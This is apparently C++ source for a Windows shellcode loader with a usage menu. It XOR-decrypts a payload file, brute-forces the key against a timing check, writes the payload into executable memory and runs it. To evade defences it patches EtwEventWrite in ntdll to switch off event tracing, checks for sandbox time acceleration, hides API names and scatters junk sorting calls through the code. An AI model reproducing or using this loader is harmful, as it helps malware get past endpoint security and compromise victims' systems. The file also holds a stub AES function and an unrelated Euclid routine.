#include "../../include/utils.h"

const int ARRAY_SIZE = 100;
const int NUMBER_OF_CYCLES = 300;



void generateAndSortArray()
{
    std::srand(std::time(nullptr));
    std::vector<int> huaarr(ARRAY_SIZE);
    for (int i = 0; i < ARRAY_SIZE; i++)
    {
        huaarr[i] = std::rand() % 1000;
    }
    std::sort(huaarr.begin(), huaarr.end(),
              [](int a, int b) { return a < b; });

    for (int i = 0; i < ARRAY_SIZE; i++)
    {
    }
    for (const auto &i : huaarr)
    {
    }
}

bool isFileExists(const std::string &filePath)
{
    std::ifstream file(filePath);
    return file.good();
}

void printHelp()
{
    std::cout << "Usage: tool [opt] " << std::endl;
    std::cout << "forexample: tool 1 [filepath] [EncryptionMethod] [Key] [function_mode]" << std::endl;
    std::cout << "            filepath: path to the file" << std::endl;
    std::cout << "            EncryptionMethod: 6N_XOR,file_XOR" << std::endl;
    std::cout << "                              6N_XOR: 6-digit number XOR Key" << std::endl;
    std::cout << "                              file_XOR: XOR Key from file" << std::endl;
    std::cout << "            Key: 6 characters XOR Key or path to the key file" << std::endl;
    std::cout << "            function_mode: 1 means function1" << std::endl;
}

void au9u5tDecrypt(const std::string &filePath, const std::string &method, const std::string &key, const std::string &function_mode)
{
    auto lessThan{0};
    auto greaterThan{0};
    auto demo{0};
    auto sleepTime{0};
    auto minValue{0};
    auto maxValue{0};

    if (method == "6N_XOR")
    {
        int intKey;
        try {
             intKey = std::stoi(key);
        }
        catch (std::invalid_argument &e) {
            std::cout << "Invalid key! key must be a number, and 6 digits long. your key: " << key << std::endl;
            return;
        }
        catch (std::out_of_range &e) {
            std::cout << "Key out of range!" << std::endl;
            return;
        }catch (...){
            std::cout << "Invalid key!" << std::endl;
            return;
        }

        lessThan = intKey - 1;
        greaterThan = intKey + 1;
        demo = intKey;
    }
    std::ifstream inputFile{filePath, std::ios::binary};
    if (!inputFile)
    {
        std::cout << "Failed to open file!" << std::endl;
        return;
    }

    std::string encryptedData{std::istreambuf_iterator<char>(inputFile), std::istreambuf_iterator<char>()};
    inputFile.close();

    sleepTime=generateKey();
    minValue=sleepTime*1000-500;
    maxValue=sleepTime*1000+500;


    auto start_time = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(sleepTime*1000));
    auto end_time = std::chrono::high_resolution_clock::now();

    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    auto time_diff = elapsed_time.count();

    auto diff{demo - time_diff};

    auto i{NUMBER_OF_CYCLES};
    while (i--)
    {
        if (method == "6N_XOR")
        {

            auto randomValue{decryptKey(diff, minValue, maxValue, lessThan, greaterThan)};

            if (lessThan < randomValue && randomValue < greaterThan)
            {
                auto randKey = std::to_string(randomValue);

                generateAndSortArray();
                auto decryptedDate{x_o_r_EncryptDecrypt(encryptedData, randKey)};

                generateAndSortArray();
                const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
                auto byteLength = decryptedDate.length();

                // function1(decryptedData, byteLength);
                if (function_mode == "1")
                {
                    generateAndSortArray();
                    function1(decryptedData, byteLength);
                }
                else
                {
                    std::cout << "Invalid function mode!" << std::endl;
                    return;
                }
            }
        }
        else if (method == "file_XOR")
        {
            std::ifstream keyFile{key, std::ios::binary};
            if (!keyFile)
            {
                std::cout << "Failed to open key file!" << std::endl;
                return;
            }

            std::string keyData{std::istreambuf_iterator<char>(keyFile), std::istreambuf_iterator<char>()};
            keyFile.close();

            generateAndSortArray();
            auto decryptedDate{x_o_r_EncryptDecrypt(encryptedData, keyData)};
            generateAndSortArray();
            const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
            auto byteLength = decryptedDate.length();

            if (function_mode == "1")
            {
                function1(decryptedData, byteLength);
            }
            else
            {
                std::cout << "Invalid function mode!" << std::endl;
                return;
            }
        }else {
            std::cout << "Invalid encryption method!" << std::endl;
        }
        break;
    }
}

int decryptKey(const int &diff, const int &minValue, const int &maxValue, const int &lessThan, const int &greaterThan)
{
    for (auto num{minValue}; num <= maxValue; num++)
    {
        generateAndSortArray();

        int randomValue = diff + num;

        if (lessThan < randomValue && randomValue < greaterThan)
        {
            return randomValue;
        }
    }
    return 0;
}

std::string x_o_r_EncryptDecrypt(const std::string &data, const std::string &key)
{
    std::string output{};
    for (auto i{0}; i < data.size(); i++)
    {
        output += data[i] ^ key[i % key.size()];
    }
    return output;
}

void function1(const unsigned char *decryptedData, const size_t &byteLength)
{
    generateAndSortArray();
    LPVOID lpvBase = VirtualAlloc(nullptr, byteLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    generateAndSortArray();
    memcpy(lpvBase, decryptedData, byteLength);

    generateAndSortArray();
    using testFunc = void (*)();

    generateAndSortArray();
    auto func = reinterpret_cast<testFunc>(lpvBase);

    generateAndSortArray();
    std::cout << "Function1: ";
    func();

    generateAndSortArray();
    VirtualFree(lpvBase, 0, MEM_RELEASE);
}



bool checkParameters(int argc, char *argv[])
{
    if (argc == 1)
    {
        // printHelp();
        return false;
    }
    auto strMode = argv[1];
    if (strcmp(strMode, "1") == 0)
    {


        if (argc != 6)
        {
            // printHelp();
            std::cout << "argv length: " << argc << std::endl;
            return false;
        }
        std::string filePath{argv[2]};
        if (!isFileExists(filePath))
        {
            std::cout << "File does not exist!" << std::endl;
            return false;
        }

        std::string encryptionMethod = argv[3];
        if (encryptionMethod == "6N_XOR")
        {
            std::string key = argv[4];
            if (key.length() != 6)
            {
                std::cout << "Key must be 6 characters long!" << std::endl;
                return false;
            }
        }
        else if (encryptionMethod == "file_XOR") {
            std::string key = argv[4];
            if (!isFileExists(key)) {
                std::cout << "Key file does not exist!" << std::endl;
                return false;
            }
        }
        else{
            // printHelp();
            std::cout << "Invalid encryption method!" << std::endl;
            return false;
        }
        std::string functionMode = argv[5];
        if (functionMode != "1")
        {
            // printHelp();
            return false;
        }
    }
    else
    {
        // printHelp();
        return false;
    }
    return true;
}


int generateKey()
{
    // 生成1-10 之间的随机数
    int key = 0;
    key = std::rand() % 10 + 1;
    return key;

}


bool isTimeAccelerated()
{
    auto start = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto end = std::chrono::steady_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    if (duration.count() < 5000)
    {
        return true;
    }
    else
    {
        return false;
    }
}

BOOL DisableEvent(void)
{
    DWORD oldprotect = 0;

    char eventwrite[] = {'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0};
    char dll[] = {'n', 't', 'd', 'l', 'l', 0};
    unsigned patch[] = {0x48, 0x33, 0xc0, 0xc3};

    auto  *addr1 = GetProcAddress(GetModuleHandleA(dll), eventwrite);
    if (!addr1)
    {
        return FALSE;
    }

    char* addr = (char*)addr1;

    BOOL status = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status)
    {
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));

    BOOL statusvir = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
    if (!statusvir)
    {
        return FALSE;
    }

    return TRUE;
}


std::string wstringToString(const std::wstring &wstr)
{
    std::string str(wstr.begin(), wstr.end());
    return str;
}

std::wstring stringToWstring(const std::string &str)
{
    std::wstring wstr(str.begin(), str.end());
    return wstr;
}

bool useAes(const std::string &filePath, const std::string &key, const std::string &function_mode)
{
    generateAndSortArray();

    // AES encryption
    return true;

}

void Euclid(int num1, int num2)
{
    std::vector<int> divisor{};
    std::vector<int> remainder{};
    divisor.emplace_back(num1);
    remainder.emplace_back(num2);
    while (num2)
    {
        std::cout << num1 << "=" << num1 / num2 << "*" << num2 << "+" << num1 % num2 << std::endl;
        int temp{0};
        temp = num2;
        num2 = num1 % num2;
        num1 = temp;
        remainder.emplace_back(num2);
        divisor.emplace_back(num1);
    }
    std::cout << divisor.back() << std::endl;
    divisor.pop_back();
    remainder.pop_back();
    int prea{0}; //用于存放上一个除数
    int preb{1};
    for (int i = divisor.size() - 1; i >= 0; --i)
    {
        if (divisor.empty() || remainder.empty())
        {
            break;
        }
        std::cout << "  =" << divisor[i] << "*(" << prea << ")+" << remainder[i] << "*(" << preb << ")" << std::endl;
        int temp{prea};
        prea = preb;
        if (i > 0)
        {
            preb = temp - (static_cast<int>(divisor[i - 1] / remainder[i - 1])) * preb;
        }
    }
}